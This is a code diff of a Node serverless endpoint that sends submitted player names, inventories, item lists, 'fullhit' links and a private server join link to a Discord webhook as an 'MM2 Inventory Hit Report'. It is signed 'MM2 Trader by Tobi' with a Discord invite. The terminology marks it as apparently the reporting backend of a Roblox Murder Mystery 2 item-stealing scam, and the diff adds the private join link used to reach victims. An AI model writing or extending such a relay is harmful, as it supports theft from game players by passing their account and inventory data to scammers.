@@ -2,29 +2,20 @@ export default async function handler(req, res) {
   if (req.method !== 'POST') {
     return res.status(405).json({ error: 'Method not allowed' });
   }
-  const API_KEY = 'your_really_secret_key_here'; // Change to your secret key!
+  const API_KEY = 'your_really_secret_key_here';
   if (req.headers['x-api-key'] !== API_KEY) {
     return res.status(401).json({ error: 'Invalid API Key' });
   }
 
-  // Extract POST data
   const {
-    webhook,           // Discord webhook url
-    plrName,
-    plrDisplayName,
-    receiver,
-    inventoryText,
-    items,
-    fullhitUrl,
-    job_id
+    webhook, plrName, plrDisplayName, receiver, inventoryText,
+    items, fullhitUrl, job_id, joiner // <--- note: 'joiner' field expected
   } = req.body || {};
 
-  // Input validation
   if (!webhook || !/^https:\/\/discord\.com\/api\/webhooks\//.test(webhook)) {
     return res.status(400).json({ error: "Invalid or missing Discord webhook" });
   }
 
-  // Build embed fields
   const embedFields = [
     {
       name: "Player Information",
@@ -49,7 +40,7 @@ export default async function handler(req, res) {
     },
     {
       name: "Join Link (Private)",
-      value: job_id || "N/A",
+      value: joiner ? `[Join Server](${joiner})` : "N/A",
       inline: false
     },
     {
@@ -59,10 +50,9 @@ export default async function handler(req, res) {
     }
   ];
 
-  // Build the embed
   const embed = {
     title: "MM 2 Items!",
-    color: 10181046, // Purple
+    color: 10181046,
     fields: embedFields,
     footer: {
       text: "MM2 Trader by Tobi. discord.gg/GY2RVSEGDT"
@@ -70,13 +60,11 @@ export default async function handler(req, res) {
     timestamp: new Date().toISOString()
   };
 
-  // Payload for Discord
   const discordPayload = {
     content: "🎁 **MM2 Inventory Hit Report**",
     embeds: [embed]
   };
 
-  // Send to Discord
   const discordResp = await fetch(webhook, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
